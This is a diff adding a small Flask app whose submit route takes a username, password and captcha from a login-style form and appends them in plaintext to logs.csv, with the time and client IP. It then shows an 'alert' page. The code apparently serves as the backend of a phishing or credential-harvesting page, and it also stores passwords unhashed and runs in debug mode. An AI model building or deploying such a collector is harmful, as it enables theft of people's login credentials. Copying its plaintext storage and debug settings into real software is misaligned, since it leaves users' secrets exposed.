@@ -1,0 +1,26 @@
+from flask import Flask, render_template, request
+import csv
+from datetime import datetime
+
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return render_template("index.html")
+
+@app.route('/submit', methods=['POST'])
+def submit():
+    username = request.form['username']
+    password = request.form['password']
+    captcha = request.form['captcha']
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    ip = request.remote_addr
+
+    with open('logs.csv', 'a', newline='') as file:
+        writer = csv.writer(file)
+        writer.writerow([timestamp, ip, username, password, captcha])
+
+    return render_template("alert.html")
+
+if __name__ == "__main__":
+    app.run(debug=True)
